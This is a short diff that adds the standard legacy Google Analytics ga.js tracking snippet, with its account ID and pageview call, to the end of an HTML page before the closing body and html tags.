+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-10525776-6']);
+      _gaq.push(['_trackPageview']);
+
+        (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+            ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+          var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+            })();
+</script>
+
+</body>
+</html>
